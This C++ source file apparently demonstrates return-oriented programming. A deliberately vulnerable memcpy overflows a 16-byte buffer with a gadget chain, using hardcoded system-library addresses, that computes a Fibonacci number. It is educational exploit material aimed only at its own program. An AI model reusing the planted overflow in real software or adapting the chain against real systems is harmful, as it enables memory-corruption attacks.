// ROPFibonacci.cpp : Defines the entry point for the console application.

#pragma check_stack(off)
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

const char newbuf[] =	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"	// fill up buffer (16)
						"\x00\x00\x00\x00"								// fill up rest of stack until return address 				
						//"\x00\x10\x40\x00"								// &hack					 
						"\x20\x10\x40\x00"								// 0x00401020 -- &flagBeginGadgets					 


						// FibSetup
						//		Move x (0x00403024) into c (0x0040303C)
						//			Load x (0x00403024) into eax
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x24\x30\x40\x00"								// 0x00403024 - &x
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//			Store eax into c (0x0040303C)
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x3C\x30\x40\x00"								// 0x0040303C - &c
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//		Store 0 into b (0x00403030) (via 5D40C033 + A2BF3FCD = 0)
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
			/*NEW*/		"\xCD\x3F\xBF\xA2"								// 0xA2BF3FCD - imm 0xA2BF3FCD
			/*NEW*/		"\x38\x29\x97\x7C"								// 0x7C972938 - add eax,0x5D40C033
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x30\x30\x40\x00"								// 0x00403030 - &b
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						
						//		Store 1 into a (0x00403048)
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
			/*NEW*/		"\x00\x00\x00\x00"								// 0x00000000 - imm 0
			/*NEW*/		"\x3B\x29\x97\x7C"								// 0x7C97293B - inc eax; pop ebp; ret;
			/*NEW*/		"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x48\x30\x40\x00"								// 0x00403048 - &a
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler

						"\x8F\xEB\x90\x7C"								// 0x7C90EB8F - NOP; NOP; NOP; NOP; NOP; RET;

						// FibCond
						//	if(n<0) set CF by performing c+80000000
						//			Load [c] (0x0040303C) into eax <FibLog stack count = 0>
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x3C\x30\x40\x00"								// 0x0040303C - &c
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//			Load 80000000 into esi
						"\x9A\x21\x90\x7C"								// 0x7C90219A - pop esi; ret;
						"\x00\x00\x00\x80"								// 0x80000000 - imm 80000000
						"\x90\x44\xC1\x77"								// 0x77C14490 - add eax,esi; ret;

						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;				-- clear ecx
						"\x00\x00\x00\x00"								// 0x00000000 - imm 0 (actually important)
						"\x71\xA3\x97\x7C"								// 0x7C97A371 - adc ecx,ecx; ret 0C;		-- if(n<0) ecx=1;	else if(n>=0) ecx=0;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x56\xC2\x93\x7C"								// 0x7C93C256 - mov eax,ecx; ret;			-- if(n<0) eax=1;	else if(n>=0) eax=0;
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=2;	else if(n>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=4;	else if(n>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=8;	else if(n>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=16;	else if(n>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=32;	else if(n>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=64;	else if(n>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x7F\x14\x97\x7C"								// 0x7C97147F - shl eax,1; pop ebp; ret;	-- if(n<0) eax=128;	else if(n>=0) eax=0;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\xFD\x3F\xC1\x77"								// 0x77C13FFD - xchg eax,ecx; ret;
						"\x44\x1C\x90\x7C"								// 0x7C901C44 - mov ebx,ecx; mov ecx,eax; mov eax,esi; pop esi; ret 10;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//	if(n<0) esp=esp+128=esp+4*32;	else if(n>=0) esp=esp; <FibCond stack count = 38>
						"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;
						// <FibCond stack count = 39>


						// FibLog
						//		a = a + b
						//			Load [b] (0x00403030) into eax <FibLog stack count = 0>
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x30\x30\x40\x00"								// 0x00403030 - &b
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//			[a] = [a] + eax (where &a is 0x00403048)
						"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
						"\x48\x30\x40\x00"								// 0x00403048 - &a
						"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret;
						//		b = -b (b is already in eax) <FibLog stack count = 8>
						"\x18\xBE\xC1\x77"								// 0x77C1BE18 - neg eax; pop ebp; ret
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//			Store eax back in [b] (0x00403030)
						"\x42\xBD\x96\x7C"								// 0x7C96BD42 - pop ecx; ret;
						"\x30\x30\x40\x00"								// 0x00403030 - &b
						"\x22\x39\x90\x7C"								// 0x7C903922 - mov [ecx],eax ret 8;
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//		b = b + a <FibLog stack count = 16>
						//			Load [a] (0x00403048) into eax
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x48\x30\x40\x00"								// 0x00403048 - &a
						"\x86\x2F\x90\x7C"								// 0x7C902F86 - mov eax,[eax]; ret 4
						"\x31\x12\x90\x7C"								// 0x7C901231 - ret;
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						//			[b] = [b] + eax (where &b is 0x00403030)
						"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
						"\x30\x30\x40\x00"								// 0x00403030 - &b
						"\x7E\xA7\xC3\x77"								// 0x77C3A77E - add [ebx],eax; ret;
						//		c = c - 1 <FibLog stack count = 24>
						//			Load &c (0x0040303C) into eax
						"\xF0\x5D\x90\x7C"								// 0x7C905DF0 - pop eax; ret;
						"\x3C\x30\x40\x00"								// 0x0040303C - &c
						//			[c] = [c] - 1
						"\x39\x1B\xC2\x77"								// 0x77C21B39 - dec [eax]; ret;
						//		esp = esp + CONST <FibLog stack count = 27>
						"\x36\x21\x90\x7C"								// 0x7C902136 - pop ebx; ret;
						"\xE8\xFE\xFF\xFF"								// 0xFFFFFEE8 - (-4)*(FibLog stack count + FibCond stack count)=(-4)*(31+39)=-280
						"\xC5\x0A\xC5\x77"								// 0x77C50AC5 - add esp,ebx; add eax,77C60C14; ret;

						// To account for FibCond adding 32 to esp
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler
						"\x00\x00\x00\x00"								// 0x00000000 - imm filler


						"\x40\x10\x40\x00"								// &printAnswer			
						;

int x;		// 0x00403024
int a;		// 0x00403048
int b;		// 0x00403030
int c;		// 0x0040303C
int d;		// 0x00403020
int e;		// 0x00403040
int f;		// 0x0040304C
int g;		// 0x00403050
int a_temp;	// 0x0040301C
int b_temp;	// 0x00403044
int c_temp;	// 0x00403018
int d_temp;	// 0x00403034
int e_temp;	// 0x00403038
int f_temp;	// 0x0040302C


void hack(void) {
	printf("Buffer overflowed!\n");
}

void flagBeginGadgets(void) {
	__asm{
		or eax,eax
		or eax,eax
		or eax,eax
	}
}

void flagEndGadgets(void) {
	__asm{
		or ebx,ebx
		or ebx,ebx
		or ebx,ebx
	}
}

void printAnswer(void) {
	flagEndGadgets();
	printf("The answer is %d\n", f);
	exit(0);
}

void printAddresses(void) {
    printf("Address of hack     = %p\n", hack);
    printf("Address of printAnswer= %p\n", printAnswer);
    printf("Address of flagBeginGadgets= %p\n", flagBeginGadgets);
    printf("Address of flagEndGadgets= %p\n", flagEndGadgets);
	printf("Address of x        = %p\n", &x);
	printf("Address of a        = %p\n", &a);
	printf("Address of b        = %p\n", &b);
	printf("Address of c        = %p\n", &c);
	printf("Address of d        = %p\n", &d);
	printf("Address of e        = %p\n", &e);
	printf("Address of f        = %p\n", &f);
	printf("Address of g        = %p\n", &g);
	printf("Address of a_temp   = %p\n", &a_temp);
	printf("Address of b_temp   = %p\n", &b_temp);
	printf("Address of c_temp   = %p\n", &c_temp);
	printf("Address of d_temp   = %p\n", &d_temp);
	printf("Address of e_temp   = %p\n", &e_temp);
	printf("Address of f_temp   = %p\n", &f_temp);
}

void exploit() {
	char buf[16];
	memcpy(buf, newbuf, sizeof(newbuf)-1);		// Where the buffer overflow occurs
	return;
}

int main(int argc, char* argv[]) {
	char extraSpace[1024];
	
	//printAddresses();							// Makes debugging easier
	//printf("Enter a value to compute: ");
	scanf("%d",&x);
	x = x - 2;

	exploit();
	return 0;
}
